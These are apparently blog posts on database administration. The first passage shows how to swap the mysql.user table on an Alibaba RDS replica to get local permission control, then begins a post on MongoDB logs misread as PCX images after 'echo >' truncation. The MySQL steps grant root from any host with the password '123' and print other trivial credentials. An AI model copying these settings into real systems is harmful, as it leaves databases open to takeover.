enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Repl_slave_priv        | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Repl_client_priv       | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Create_view_priv       | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Show_view_priv         | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Create_routine_priv    | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Alter_routine_priv     | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Create_user_priv       | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Event_priv             | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Trigger_priv           | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Create_tablespace_priv | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| ssl_type               | enum('','ANY','X509','SPECIFIED') | NO   |     |         |       |</span><br><span class="line">| ssl_cipher             | blob                              | NO   |     | NULL    |       |</span><br><span class="line">| x509_issuer            | blob                              | NO   |     | NULL    |       |</span><br><span class="line">| x509_subject           | blob                              | NO   |     | NULL    |       |</span><br><span class="line">| max_questions          | int(11) unsigned                  | NO   |     | 0       |       |</span><br><span class="line">| max_updates            | int(11) unsigned                  | NO   |     | 0       |       |</span><br><span class="line">| max_connections        | int(11) unsigned                  | NO   |     | 0       |       |</span><br><span class="line">| max_user_connections   | int(11) unsigned                  | NO   |     | 0       |       |</span><br><span class="line">| plugin                 | char(64)                          | YES  |     |         |       |</span><br><span class="line">| authentication_string  | text                              | YES  |     | NULL    |       |</span><br><span class="line">+------------------------+-----------------------------------+------+-----+---------+-------+</span><br><span class="line">42 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:47:  [mysql]&gt; delete from mysql.user_1 where user='root';</span><br><span class="line">Query OK, 3 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:51:  [mysql]&gt; insert into mysql.user_1 values ('%','root', '', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; insert into mysql.user_1 values ('%','joowingbuz', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; insert into mysql.user_1 values ('%','ottersync', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; insert into mysql.user_1 values ('%','syncdw', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; insert into mysql.user_1 values ('%','datasis', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; insert into mysql.user_1 values ('%','joowingv', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; insert into mysql.user_1 values ('%','datadev', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; insert into mysql.user_1 values ('%','readonly', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; select user,host,authentication_string from mysql.user;</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| user | host      | authentication_string                     |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| root | localhost | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | 127.0.0.1 | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | ::1       | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; select user,host,authentication_string from mysql.user_1;</span><br><span class="line">+------------+------+-------------------------------------------+</span><br><span class="line">| user       | host | authentication_string                     |</span><br><span class="line">+------------+------+-------------------------------------------+</span><br><span class="line">| ottersync  | %    | *9443FA914A2D69FE8832F8294E7422CC1B02A492 |</span><br><span class="line">| joowingbuz | %    | *DFFDA1CA6135E355EF468AB13A465BB5D4FE2B11 |</span><br><span class="line">| root       | %    | *89BE852E4EECFD217F0C5463FB30AD25BD0751E0 |</span><br><span class="line">| syncdw     | %    | *3DD7B4B4F6EE968FF3452B607BDEE6294B6A425A |</span><br><span class="line">| datasis    | %    | *011D511C71990F832C531A0F9CFB34CF7BB4E485 |</span><br><span class="line">| joowingv   | %    | *56B364074270DF7F6D670A6B4F5A4AD13322397A |</span><br><span class="line">| datadev    | %    | *D3D73E0F6BFC3159B024EF31484B6F9CC2963C5B |</span><br><span class="line">| readonly   | %    | *E2BA196C0C7F409990FDB3FAB5F9C7CE95F7C449 |</span><br><span class="line">+------------+------+-------------------------------------------+</span><br><span class="line">8 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@joowing-server-06:~# /data/mysql/support-files/mysql.server stop</span><br><span class="line">Shutting down MySQL</span><br><span class="line">...... * </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@joowing-server-06:~# cd /data/xtrabackup_data/</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data# cd mysql</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# ll user*</span><br><span class="line">-rw-r----- 1 mysql mysql 10630 8月  14 15:42 user_1.frm</span><br><span class="line">-rw-r----- 1 mysql mysql   744 8月  14 15:52 user_1.MYD</span><br><span class="line">-rw-r----- 1 mysql mysql  2048 8月  14 15:53 user_1.MYI</span><br><span class="line">-rw-r----- 1 mysql mysql 10630 8月   9 20:14 user.frm</span><br><span class="line">-rw-r----- 1 mysql mysql 98304 8月   9 20:14 user.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql   328 8月   9 20:14 user.MYD</span><br><span class="line">-rw-r--r-- 1 mysql mysql  2048 8月   9 20:14 user.MYI</span><br><span class="line">-rw-r----- 1 mysql mysql  3569 8月   9 20:14 user.TRG</span><br><span class="line">-rw-r----- 1 mysql mysql  3982 8月   9 20:14 user_view.frm</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# mv user.frm user.ibd user.MYD user.MYI user.TRG /data</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# ll user*</span><br><span class="line">-rw-r----- 1 mysql mysql 10630 8月  14 15:42 user_1.frm</span><br><span class="line">-rw-r----- 1 mysql mysql   744 8月  14 15:52 user_1.MYD</span><br><span class="line">-rw-r----- 1 mysql mysql  2048 8月  14 15:53 user_1.MYI</span><br><span class="line">-rw-r----- 1 mysql mysql  3982 8月   9 20:14 user_view.frm</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# mv user_1.frm user.frm</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# mv user_1.MYI user.MYI</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# mv user_1.MYD user.MYD</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# ll user*</span><br><span class="line">-rw-r----- 1 mysql mysql 10630 8月  14 15:42 user.frm</span><br><span class="line">-rw-r----- 1 mysql mysql   744 8月  14 15:52 user.MYD</span><br><span class="line">-rw-r----- 1 mysql mysql  2048 8月  14 15:53 user.MYI</span><br><span class="line">-rw-r----- 1 mysql mysql  3982 8月   9 20:14 user_view.frm</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# /data/mysql/support-files/mysql.server start</span><br><span class="line">Starting MySQL</span><br><span class="line">...... * </span><br><span class="line"></span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# mysql -uroot -p'123'</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 5</span><br><span class="line">Server version: 5.7.20-log MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:55:  [(none)]&gt; show slave status\G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">               Slave_IO_State: Waiting for master to send event</span><br><span class="line">                  Master_Host: rm-uf6f05k2rg95s23bp.mysql.rds.aliyuncs.com</span><br><span class="line">                  Master_User: idc_slave</span><br><span class="line">                  Master_Port: 3306</span><br><span class="line">                Connect_Retry: 60</span><br><span class="line">              Master_Log_File: mysql-bin.001641</span><br><span class="line">          Read_Master_Log_Pos: 447207506</span><br><span class="line">               Relay_Log_File: joowing-server-06-relay-bin.000225</span><br><span class="line">                Relay_Log_Pos: 35529076</span><br><span class="line">        Relay_Master_Log_File: mysql-bin.001641</span><br><span class="line">             Slave_IO_Running: Yes</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line">              Replicate_Do_DB: </span><br><span class="line">          Replicate_Ignore_DB: </span><br><span class="line">           Replicate_Do_Table: </span><br><span class="line">       Replicate_Ignore_Table: </span><br><span class="line">      Replicate_Wild_Do_Table: </span><br><span class="line">  Replicate_Wild_Ignore_Table: mysql.%,sys.%,information_schema.%</span><br><span class="line">                   Last_Errno: 0</span><br><span class="line">                   Last_Error: </span><br><span class="line">                 Skip_Counter: 0</span><br><span class="line">          Exec_Master_Log_Pos: 447207506</span><br><span class="line">              Relay_Log_Space: 35529295</span><br><span class="line">              Until_Condition: None</span><br><span class="line">               Until_Log_File: </span><br><span class="line">                Until_Log_Pos: 0</span><br><span class="line">           Master_SSL_Allowed: No</span><br><span class="line">           Master_SSL_CA_File: </span><br><span class="line">           Master_SSL_CA_Path: </span><br><span class="line">              Master_SSL_Cert: </span><br><span class="line">            Master_SSL_Cipher: </span><br><span class="line">               Master_SSL_Key: </span><br><span class="line">        Seconds_Behind_Master: 0</span><br><span class="line">Master_SSL_Verify_Server_Cert: No</span><br><span class="line">                Last_IO_Errno: 0</span><br><span class="line">                Last_IO_Error: </span><br><span class="line">               Last_SQL_Errno: 0</span><br><span class="line">               Last_SQL_Error: </span><br><span class="line">  Replicate_Ignore_Server_Ids: </span><br><span class="line">             Master_Server_Id: 1095052097</span><br><span class="line">                  Master_UUID: b3e1de69-5daa-11e8-bed2-7cd30ab8a9fc</span><br><span class="line">             Master_Info_File: mysql.slave_master_info</span><br><span class="line">                    SQL_Delay: 0</span><br><span class="line">          SQL_Remaining_Delay: NULL</span><br><span class="line">      Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates</span><br><span class="line">           Master_Retry_Count: 86400</span><br><span class="line">                  Master_Bind: </span><br><span class="line">      Last_IO_Error_Timestamp: </span><br><span class="line">     Last_SQL_Error_Timestamp: </span><br><span class="line">               Master_SSL_Crl: </span><br><span class="line">           Master_SSL_Crlpath: </span><br><span class="line">           Retrieved_Gtid_Set: b3e1de69-5daa-11e8-bed2-7cd30ab8a9fc:97478646-97483368</span><br><span class="line">            Executed_Gtid_Set: b3e1de69-5daa-11e8-bed2-7cd30ab8a9fc:1-97483368,</span><br><span class="line">c39ecf19-5daa-11e8-aa9c-7cd30ac4764a:1-178658794,</span><br><span class="line">c69289d7-9bc9-11e8-b922-44a842431b62:1-12</span><br><span class="line">                Auto_Position: 1</span><br><span class="line">         Replicate_Rewrite_DB: </span><br><span class="line">                 Channel_Name: </span><br><span class="line">           Master_TLS_Version: </span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR: </span><br><span class="line">No query specified</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 验证只读账号</span></span><br><span class="line">mysql -uroot-p'123'  -e "create database dbzyadmin;"</span><br><span class="line">mysql -ujoowingbuz -p'123'  -e "create database dbzyadmin;"</span><br><span class="line">mysql -uottersync -p'123'  -e "create database dbzyadmin;"</span><br><span class="line">mysql -usyncdw -p'123'  -e "create database dbzyadmin;"</span><br><span class="line">mysql -udatasis -p'123'  -e "create database dbzyadmin;"</span><br><span class="line">mysql -ujoowingv -p'123'  -e "create database dbzyadmin;"</span><br><span class="line">mysql -udatadev -p'123' -e "create database dbzyadmin;"</span><br><span class="line">mysql -ureadonly -p'123'  -e "create database dbzyadmin;"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 只读账号无法执行写操作，验证成功</span></span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">ERROR 1044 (42000) at line 1: Access denied for user 'readonly'@'%' to database 'dbzyadmin'</span><br></pre></td></tr></table></figure><h4 id="后续用户权限变更操作指南"><a href="#后续用户权限变更操作指南" class="headerlink" title="后续用户权限变更操作指南"></a>后续用户权限变更操作指南</h4><blockquote><p>后续新增用户、删除用户、更改密码命令如下：</p></blockquote><h5 id="新增读写用户"><a href="#新增读写用户" class="headerlink" title="新增读写用户"></a>新增读写用户</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into mysql.user_1 values ('%','【用户名】', '', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', '', '', '', '', 0, 0, 0, 0, '', password('【密码】'));</span><br></pre></td></tr></table></figure><h5 id="新增只读用户"><a href="#新增只读用户" class="headerlink" title="新增只读用户"></a>新增只读用户</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into mysql.user_1 values ('%','【用户名】', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('【密码】'));</span><br></pre></td></tr></table></figure><h5 id="删除用户命令"><a href="#删除用户命令" class="headerlink" title="删除用户命令"></a>删除用户命令</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from mysql.user where user='【用户名】';</span><br></pre></td></tr></table></figure><h5 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update mysql.user set authentication_string=password('【密码】') where user='【用户名】';</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>RDS目前使用MySQL版本和官方在系统库上差异还是很大的，若需要搭建RDS到线下自建MySQL5.7的主从时，可以通过此法去实现。</p><p>本文中对user表的破解，同样适适用于<code>mysql.db</code> 、<code>mysql.tables_priv</code>表，都破解则可以将权限从用户拓展到库表列。读者可自行实验测试。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;摘要: 阿里云的RDS For MySQL 5.7 到线下IDC机房的主从搭建相信看官方文档就可以完成，但是搭建之后却发现无法在本地进行认证权限的管理，这是为何？而阿里官方推荐使用DTS同步工具去实现，这个费用着实不少，又是否能够破解呢？本文详解如何暴力破解user表实现从库用户权限更改功能&lt;/p&gt;
    
    </summary>
    
    
      <category term="技术广角" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/"/>
    
      <category term="MySQL" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/MySQL/"/>
    
    
      <category term="RDS" scheme="http://www.toberoot.com/tags/RDS/"/>
    
      <category term="主从同步" scheme="http://www.toberoot.com/tags/%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5/"/>
    
  </entry>
  
  <entry>
    <title>利用split工具解决一次MongoDB日志异常问题</title>
    <link href="http://www.toberoot.com/2018/08/03/booboo_others/%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/"/>
    <id>http://www.toberoot.com/2018/08/03/booboo_others/%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/</id>
    <published>2018-08-03T12:25:24.000Z</published>
    <updated>2020-03-22T08:32:42.584Z</updated>
    
    <content type="html"><![CDATA[<p>摘要： </p><ul><li>某天晚上刚到家不久，就接到杭州同事的电话，客户MongoDB集群中的某个分片节点CPU飙高，初步判断是慢查询，现在需要拉取CPU飙高时间段的慢查询。心想拉取慢查询应该很快，不就是个系统日志吗？而且还做了日志切割一天一个，按道理很快搞定的，谁知当天晚上搞了接近三个小时也没搞定。究竟发生了什么？</li><li>进入到日志目录一看，目前保留近7天的日志，每天的日志量在23G~24G，我当时就想这个客户数据量这么大！后续发现日志格式本该为普通文本文件确变成了图片格式，究竟为何会文件格式会转变？能否从图片格式中拉取指定时间段的日志呢？</li><li>第二天到公司，由于客户环境我们也是第一次接手，因此咱们技术专家团队搞了一个3人的”专家会诊”，经过了一番折腾总算把原因找到了，具体过程请看下文！</li></ul><a id="more"></a><h2 id="故事背景"><a href="#故事背景" class="headerlink" title="故事背景"></a>故事背景</h2><h3 id="数据库明细"><a href="#数据库明细" class="headerlink" title="数据库明细"></a>数据库明细</h3><p>说在前面：</p><ul><li>数据库：MongoDB集群 4个分片节点</li><li>分片节点规格：16核 / 32G CentOS 7.4 64位</li><li>数据目录所在磁盘: 300G   49G  252G  17% /data</li></ul><h3 id="故事情节"><a href="#故事情节" class="headerlink" title="故事情节"></a>故事情节</h3><ul><li>某天晚上刚到家不久，就接到杭州同事的电话，客户MongoDB集群中的某个分片节点CPU飙高，初步判断是慢查询，现在需要拉取CPU飙高时间段的慢查询。心想拉取慢查询应该很快，不就是个系统日志吗？而且还做了日志切割一天一个，按道理很快搞定的，谁知当天晚上搞了接近三个小时也没搞定。究竟发生了什么？</li><li>进入到日志目录一看，目前保留近7天的日志，每天的日志量在23G~24G，我当时就想这个客户数据量这么大！后续发现日志格式本该为普通文本文件确变成了图片格式，究竟为何会文件格式会转变？能否从图片格式中拉取指定时间段的日志呢？</li><li>第二天到公司，由于客户环境我们也是第一次接受，因此咱们技术专家团队搞了一个3人的”专家会诊”，经过了一番折腾总算把原因找到了，具体过程请看下文！</li></ul><h2 id="复现与剖析"><a href="#复现与剖析" class="headerlink" title="复现与剖析"></a>复现与剖析</h2><h3 id="拉取日志异常"><a href="#拉取日志异常" class="headerlink" title="拉取日志异常"></a>拉取日志异常</h3><p><strong>使用mlogfilter过滤文件时报错说文件非mongodb的日志文件</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@sh_01 booboo]# mlogfilter shard.log.2018-08-01 --from 2018-08-01T15:00:00.000+0800 --to "+1h" --slow 1000 &gt; /alidata/booboo/tf.1</span><br><span class="line">报错:非mongodb日志格式</span><br></pre></td></tr></table></figure><p>回到客户服务器检查日志文件格式，明细如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@MONGO-SHARD-18 logs]# file *</span><br><span class="line">shard.log:            PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-25: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-26: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-27: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-28: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-29: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-30: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-31: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-08-01: PCX ver. 2.5 image data</span><br></pre></td></tr></table></figure><p>mongodb的日志正常应该为：<code>ASCII text, with very long lines</code>，但是现在却变成了<code>PCX ver. 2.5 image data</code>。需要弄清楚原因。</p><h3 id="日志异常分析"><a href="#日志异常分析" class="headerlink" title="日志异常分析"></a>日志异常分析</h3><ul><li>为什么客户每天的日志量达到22个G，并且每天的日志量都是大于等于前一天？很显然，日志截断有问题。</li><li>这个是近7天的日志，而日志格式变成了PCX图片格式是为何？</li><li>怀疑每次日志轮询时都没有真正截断日志！</li></ul><p><img src="%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/01.png" alt=""></p><h3 id="分析原日志切割明细"><a href="#分析原日志切割明细" class="headerlink" title="分析原日志切割明细"></a>分析原日志切割明细</h3><p><img src="%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/03.png" alt=""></p><p>怀疑与<code>echo &gt;</code>有关，进行验证。</p><h3 id="验证echo-gt-与PCX图片头部0a一致"><a href="#验证echo-gt-与PCX图片头部0a一致" class="headerlink" title="验证echo &gt;与PCX图片头部0a一致"></a>验证<code>echo &gt;</code>与<code>PCX图片头部0a一致</code></h3><ol><li>建一个空文档<code>log</code>；执行<code>echo &gt; log</code>；通过<code>cat -A log</code>查看文件中插入了一个符号即换行符<code>\n</code></li><li>通过<code>hexdump -c log</code> 查看测试文件头部显示为ASCII字符 <code>\n</code></li><li>通过<code>hexdump -d log</code> 查看测试文件头部显示为16进制<code>00010</code> 即<code>0a</code></li><li>通过<code>vim</code> 用16进制查看文档<code>log</code>可以看到log的文件头部为<code>0a</code>，正是PCX图片的头部</li><li>生产环境查看客户有问题的mongodb系统日志文件格式为<code>PCX</code>图片格式</li><li>通过<code>hexdump -c log</code> 显示为ASCII字符，生产日志文件头部与测试的log一致，都是<code>\n</code></li><li>通过<code>hexdump -d log</code>显示为16进制，生产日志文件头部与测试的log一致<code>00010</code> 即 <code>0a</code></li></ol><p><img src="%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/02.png" alt=""></p><p><strong>到此验证成功:通过<code>echo &gt; log</code>的方式会往文件头部新增’0a’</strong></p><hr><h3 id="复现MongoDB日志从ASCII-text转变为PCX-格式"><a href="#复现MongoDB日志从ASCII-text转变为PCX-格式" class="headerlink" title="复现MongoDB日志从ASCII text转变为PCX 格式"></a>复现MongoDB日志从ASCII text转变为PCX 格式</h3><p>在测试环境中复现日志从<code>ASCII text</code>变成<code>PCX ver. 2.5 image data</code></p><ol><li>通过mongo登陆数据库执行大量的插入操作</li><li>通过echo &gt; mongod27017.log  命令尝试清空mongod27017.log</li><li>查看截断后的日志文件格式，变成了very short file (no magic)</li><li>等文档插入完毕</li><li>通过<code>tail -f</code> 查看日志明细，看到确实有日志写入</li><li>查看日志格式，发现变成了<code>PCX ver. 2.5 image data</code></li></ol><p><img src="%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/05.png" alt=""></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">[root@sh_01 ~]# mongo</span><br><span class="line">MongoDB shell version: 3.2.16</span><br><span class="line">connecting to: test</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> db.auth(<span class="string">'test_dev'</span>,<span class="string">'uplooking'</span>)</span></span><br><span class="line">1</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> db.t1.find()</span></span><br><span class="line">&#123; "_id" : ObjectId("5b5ebb6796b8b74a73ee30f6"), "a" : 1, "b" : 2 &#125;</span><br><span class="line">&#123; "_id" : ObjectId("5b5ebb6996b8b74a73ee30f7"), "a" 